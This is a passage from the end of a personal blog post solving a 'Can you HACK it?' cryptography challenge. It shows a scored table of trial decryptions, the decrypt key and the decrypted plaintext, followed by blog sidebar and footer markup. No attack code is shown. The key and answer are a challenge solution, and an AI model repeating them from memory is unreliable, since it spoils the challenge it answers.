+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">the,dCick,wDown,sYx jyxFs ozpD thi5Zazy,qYg 0.12037037037037036</span><br><span class="line">tql,vCizb,eDong,aYx9cyjFs9fzbD mai&apos;Zacp,cYg 0.13513513513513514</span><br><span class="line">the vCick eDown aYx jujFs ovbD the&apos;Zazy cYg 0.21714285714285714</span><br><span class="line">tql7vCizb7eDong7aYx9cbjFs9fabD mar&apos;Zacp7cYg 0.2682926829268293</span><br><span class="line">thd qcicj bdowo fyx kumfs nved tie zazx dyg 0.32857142857142857</span><br><span class="line">thl7qcicb7bdowg7fyx cbmfs faed tar zazp7dyg 0.36324786324786323</span><br><span class="line">the qsick btown fix jumvs ovet the jazy dig 0.4342857142857143</span><br><span class="line">the puick crown gox julps ovdr the!lazy eog 0.4428571428571429</span><br><span class="line">the,quick,brown,fox jymps ozer thi lazy,dog 0.6657142857142857</span><br><span class="line">the quick brown fox jumps over the lazy dog 1</span><br></pre></td></tr></table></figure>
+<p>Finally, my decrypt key is <code>TNbNwu</code>.</p>
+<section class="message is-default">
+<p>The decrypted message is &#x2018;the quick brown fox jumps over the lazy dog&#x2019;.</p>
+</section>
+<h2><span id="automatic-scripts">Automatic scripts</span><a href="#automatic-scripts" class="header-anchor">#</a></h2><p><a href="https://github.com/ganlvtech/can-you-hack-it" target="_blank" rel="noopener">https://github.com/ganlvtech/can-you-hack-it</a></p>
+</div>
+<footer class="article-footer">
+<a data-url="https://ganlvtech.github.io/2019/01/12/can-you-hack-it/" data-id="cjqtoo4sg0010j0xg3szhm05b" class="article-share-link">Share</a>
+<a href="https://ganlvtech.github.io/2019/01/12/can-you-hack-it/#disqus_thread" class="article-comment-link">留言</a>
+<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/challenge/">challenge</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/crypto/">crypto</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/inject/">inject</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/js/">js</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/rot/">rot</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/">sql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xor/">xor</a></li></ul>
+</footer>
+</div>
+<nav id="article-nav">
+<a href="/2019/01/06/webpack-demo/" id="article-nav-older" class="article-nav-link-wrap">
+<strong class="article-nav-caption">Older</strong>
+<div class="article-nav-title">webpack-demo</div>
+</a>
+</nav>
+</article>
+<section id="comments">
+<div id="disqus_thread">
+<noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+</section>
+<aside id="sidebar">
+<div class="widget-wrap">
+<h3 class="widget-title">标签</h3>
+<div class="widget">
+<ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PATH/">PATH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/anchor/">anchor</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/audit/">audit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bilibili/">bilibili</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bulma/">bulma</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/challenge/">challenge</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chrome/">chrome</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ci/">ci</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/comment/">comment</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/comparison/">comparison</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/css/">css</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/debug/">debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/default/">default</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/demo/">demo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/devtools/">devtools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/disqus/">disqus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/extension/">extension</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/filesystem/">filesystem</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flex/">flex</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/frontend/">frontend</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftp/">ftp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gem/">gem</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gfw/">gfw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/github/">github</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/golang/">golang</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/google/">google</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gooreplacer/">gooreplacer</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/grub/">grub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hack/">hack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heartbeat/">heartbeat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/homestead/">homestead</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hosts/">hosts</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/href/">href</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/html/">html</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http/">http</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/i18n/">i18n</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/idea/">idea</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/inject/">inject</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jekyll/">jekyll</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jetbrains/">jetbrains</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/link/">link</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/live/">live</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/locale/">locale</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/markdown/">markdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/memory/">memory</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nat/">nat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/network/">network</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nic/">nic</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/node-js/">node.js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/noopener/">noopener</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/npm/">npm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pages/">pages</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phishing/">phishing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/photoshop/">photoshop</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phpstorm/">phpstorm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/plugin/">plugin</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/preference/">preference</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/production/">production</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pure-ftpd/">pure-ftpd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pycharm/">pycharm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ram/">ram</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redirect/">redirect</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/registry/">registry</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rot/">rot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ruby/">ruby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sass/">sass</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/server/">server</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/setting/">setting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/software/">software</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssl/">ssl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/teredo/">teredo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/test/">test</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tls/">tls</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/travis/">travis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tunnel/">tunnel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tutorial/">tutorial</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/">ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virtualbox/">virtualbox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vm/">vm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vue/">vue</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webpack/">webpack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/websocket/">websocket</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xor/">xor</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xx-net/">xx-net</a></li></ul>
+</div>
+</div>
+<div class="widget-wrap">
+<h3 class="widget-title">标签云</h3>
+<div class="widget tagcloud">
+<a href="/tags/PATH/" style="font-size:10px">PATH</a> <a href="/tags/anchor/" style="font-size:10px">anchor</a> <a href="/tags/audit/" style="font-size:10px">audit</a> <a href="/tags/bilibili/" style="font-size:12px">bilibili</a> <a href="/tags/bulma/" style="font-size:10px">bulma</a> <a href="/tags/challenge/" style="font-size:10px">challenge</a> <a href="/tags/chrome/" style="font-size:16px">chrome</a> <a href="/tags/ci/" style="font-size:12px">ci</a> <a href="/tags/comment/" style="font-size:10px">comment</a> <a href="/tags/comparison/" style="font-size:10px">comparison</a> <a href="/tags/crypto/" style="font-size:10px">crypto</a> <a href="/tags/css/" style="font-size:14px">css</a> <a href="/tags/debug/" style="font-size:10px">debug</a> <a href="/tags/default/" style="font-size:10px">default</a> <a href="/tags/demo/" style="font-size:10px">demo</a> <a href="/tags/devtools/" style="font-size:14px">devtools</a> <a href="/tags/disqus/" style="font-size:10px">disqus</a> <a href="/tags/extension/" style="font-size:10px">extension</a> <a href="/tags/filesystem/" style="font-size:10px">filesystem</a> <a href="/tags/flex/" style="font-size:10px">flex</a> <a href="/tags/frontend/" style="font-size:10px">frontend</a> <a href="/tags/ftp/" style="font-size:10px">ftp</a> <a href="/tags/gem/" style="font-size:10px">gem</a> <a href="/tags/gfw/" style="font-size:16px">gfw</a> <a href="/tags/git/" style="font-size:10px">git</a> <a href="/tags/github/" style="font-size:12px">github</a> <a href="/tags/golang/" style="font-size:10px">golang</a> <a href="/tags/google/" style="font-size:10px">google</a> <a href="/tags/gooreplacer/" style="font-size:10px">gooreplacer</a> <a href="/tags/grub/" style="font-size:10px">grub</a> <a href="/tags/hack/" style="font-size:10px">hack</a> <a href="/tags/heartbeat/" style="font-size:10px">heartbeat</a> <a href="/tags/hexo/" style="font-size:18px">hexo</a> <a href="/tags/homestead/" style="font-size:10px">homestead</a> <a href="/tags/hosts/" style="font-size:10px">hosts</a> <a href="/tags/href/" style="font-size:10px">href</a> <a href="/tags/html/" style="font-size:16px">html</a> <a href="/tags/http/" style="font-size:10px">http</a> <a href="/tags/i18n/" style="font-size:10px">i18n</a> <a href="/tags/idea/" style="font-size:10px">idea</a> <a href="/tags/inject/" style="font-size:10px">inject</a> <a href="/tags/jekyll/" style="font-size:10px">jekyll</a> <a href="/tags/jetbrains/" style="font-size:10px">jetbrains</a> <a href="/tags/js/" style="font-size:20px">js</a> <a href="/tags/link/" style="font-size:10px">link</a> <a href="/tags/linux/" style="font-size:10px">linux</a> <a href="/tags/live/" style="font-size:10px">live</a> <a href="/tags/locale/" style="font-size:10px">locale</a> <a href="/tags/markdown/" style="font-size:10px">markdown</a> <a href="/tags/memory/" style="font-size:10px">memory</a> <a href="/tags/nat/" style="font-size:10px">nat</a> <a href="/tags/network/" style="font-size:10px">network</a> <a href="/tags/nic/" style="font-size:10px">nic</a> <a href="/tags/node-js/" style="font-size:16px">node.js</a> <a href="/tags/noopener/" style="font-size:10px">noopener</a> <a href="/tags/npm/" style="font-size:16px">npm</a> <a href="/tags/pages/" style="font-size:14px">pages</a> <a href="/tags/phishing/" style="font-size:10px">phishing</a> <a href="/tags/photoshop/" style="font-size:10px">photoshop</a> <a href="/tags/php/" style="font-size:12px">php</a> <a href="/tags/phpstorm/" style="font-size:10px">phpstorm</a> <a href="/tags/plugin/" style="font-size:10px">plugin</a> <a href="/tags/preference/" style="font-size:10px">preference</a> <a href="/tags/production/" style="font-size:10px">production</a> <a href="/tags/pure-ftpd/" style="font-size:10px">pure-ftpd</a> <a href="/tags/pycharm/" style="font-size:10px">pycharm</a> <a href="/tags/ram/" style="font-size:10px">ram</a> <a href="/tags/redirect/" style="font-size:10px">redirect</a> <a href="/tags/registry/" style="font-size:10px">registry</a> <a href="/tags/rot/" style="font-size:10px">rot</a> <a href="/tags/ruby/" style="font-size:10px">ruby</a> <a href="/tags/sass/" style="font-size:10px">sass</a> <a href="/tags/server/" style="font-size:12px">server</a> <a href="/tags/setting/" style="font-size:10px">setting</a> <a href="/tags/software/" style="font-size:10px">software</a> <a href="/tags/sql/" style="font-size:10px">sql</a> <a href="/tags/ssh/" style="font-size:10px">ssh</a> <a href="/tags/ssl/" style="font-size:12px">ssl</a> <a href="/tags/teredo/" style="font-size:10px">teredo</a> <a href="/tags/test/" style="font-size:10px">test</a> <a href="/tags/tls/" style="font-size:10px">tls</a> <a href="/tags/travis/" style="font-size:12px">travis</a> <a href="/tags/tunnel/" style="font-size:10px">tunnel</a> <a href="/tags/tutorial/" style="font-size:12px">tutorial</a> <a href="/tags/ubuntu/" style="font-size:16px">ubuntu</a> <a href="/tags/virtualbox/" style="font-size:10px">virtualbox</a> <a href="/tags/vm/" style="font-size:10px">vm</a> <a href="/tags/vue/" style="font-size:10px">vue</a> <a href="/tags/web/" style="font-size:10px">web</a> <a href="/tags/webpack/" style="font-size:12px">webpack</a> <a href="/tags/websocket/" style="font-size:10px">websocket</a> <a href="/tags/windows/" style="font-size:10px">windows</a> <a href="/tags/xor/" style="font-size:10px">xor</a> <a href="/tags/xx-net/" style="font-size:10px">xx-net</a>
+</div>
+</div>
+<div class="widget-wrap">
+<h3 class="widget-title">归档</h3>
+<div class="widget">
+<ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a></li></ul>
+</div>
+</div>
+<div class="widget-wrap">
+<h3 class="widget-title">最新文章</h3>
+<div class="widget">
+<ul>
+<li>
+<a href="/2019/01/12/can-you-hack-it/">Can you HACK it?</a>
+</li>
+<li>
+<a href="/2019/01/06/webpack-demo/">webpack-demo</a>
+</li>
+<li>
+<a href="/2019/01/03/php-tutorial-01-hello-world/">PHP Tutorial 01 - Hello, world!</a>
+</li>
+<li>
+<a href="/2019/01/03/php-tutorial-00-why-php/">PHP Tutorial 00 - Why PHP?</a>
+</li>
+<li>
+<a href="/2018/12/15/bilibili-live-personal-introduction/">Bilibili Live Personal Introduction</a>
+</li>
+</ul>
+</div>
+</div>
+</aside>
+</div>
+<footer id="footer">
+<div class="outer">
+<div id="footer-info" class="inner">
+&copy; 2019 Ganlv<br>
+Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+</div>
+</div>
+</footer>
+</div>
+<nav id="mobile-nav">
+<a href="/" class="mobile-nav-link">Home</a>
+<a href="/archives" class="mobile-nav-link">Archives</a>
+</nav>
+<script>var disqus_shortname="ganlvtech",disqus_url="https://ganlvtech.github.io/2019/01/12/can-you-hack-it/";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//c.disquscdn.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script src="/js/BSOD.js"></script>
+<script src="/js/script.js"></script>
+</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
